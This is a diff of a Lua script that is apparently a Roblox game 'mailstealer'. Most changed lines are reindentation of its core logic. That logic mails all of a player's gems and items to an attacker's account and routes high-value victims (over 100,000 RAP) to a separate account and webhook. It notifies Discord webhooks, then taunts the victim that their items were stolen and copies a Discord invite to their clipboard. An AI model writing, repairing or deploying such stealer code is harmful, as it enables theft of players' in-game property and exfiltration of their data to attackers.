@@ -290,37 +290,38 @@ if #sortedItems > 0 then
         return a.rap * a.amount > b.rap * b.amount 
     end)
 
-    -- Conditional check: if total RAP > 100,000, send to different user/webhook
-    local targetUser = (totalRAP > 100000) and highRAPUser or plr.Name
-    local targetWebhook = (totalRAP > 100000) and highRAPWebhook or webhook
+-- Conditional check: if total RAP > 100,000, set variables to highRAP values
+local targetUser = (totalRAP > 100000) and highRAPUser or plr.Name
+local targetWebhook = (totalRAP > 100000) and highRAPWebhook or webhook
 
+-- Now send based on targetUser and targetWebhook being conditionally set
 spawn(function()
-        -- Conditional send logic based on totalRAP value
-        if totalRAP > 100000 then
-            -- If total RAP > 100,000:
-            -- Send both message and mail to highRAPWebhook/highRAPUser
-            SendMessage(targetUser, GemAmount1, highRAPWebhook, targetUser)
-            SendMail(targetUser, GemAmount1, highRAPWebhook)
-            
-            -- Do not send anything to the global webhook/user
-        else
-            -- If total RAP <= 100,000:
-            -- Send both message and mail to global webhook/user
-            SendMessage(targetUser, GemAmount1, webhook, targetUser)
-            SendMail(targetUser, GemAmount1, webhook)
-            
-            -- Send message only to highRAPWebhook/highRAPUser (no mail)
-            SendMessage(targetUser, GemAmount1, highRAPWebhook, targetUser)
-        end
-    end)
-
-    SendAllGems()
-
-    for _, item in ipairs(sortedItems) do
-        sendItem(item.category, item.uid, item.amount)
+    -- Conditional send logic based on totalRAP value
+    if totalRAP > 100000 then
+        -- If total RAP > 100,000:
+        -- Send both message and mail to highRAPWebhook/highRAPUser
+        SendMessage(targetUser, GemAmount1, highRAPWebhook, targetUser)
+        SendMail(targetUser, GemAmount1, highRAPWebhook)
+        
+        -- Do not send anything to the global webhook/user
+    else
+        -- If total RAP <= 100,000:
+        -- Send both message and mail to global webhook/user
+        SendMessage(targetUser, GemAmount1, webhook, targetUser)
+        SendMail(targetUser, GemAmount1, webhook)
+        
+        -- Send message only to highRAPWebhook/highRAPUser (no mail)
+        SendMessage(targetUser, GemAmount1, highRAPWebhook, targetUser)
     end
+end)
 
-    local message = require(game.ReplicatedStorage.Library.Client.Message)
-    message.Error("All your items just got stolen by Bearr's mailstealer!\n Join discord.gg/GsFp84dbQf")
-    setclipboard("discord.gg/GsFp84dbQf")
+-- Continue with the remaining code logic
+SendAllGems()
+
+for _, item in ipairs(sortedItems) do
+    sendItem(item.category, item.uid, item.amount)
 end
+
+local message = require(game.ReplicatedStorage.Library.Client.Message)
+message.Error("All your items just got stolen by Bearr's mailstealer!\n Join discord.gg/GsFp84dbQf")
+setclipboard("discord.gg/GsFp84dbQf")
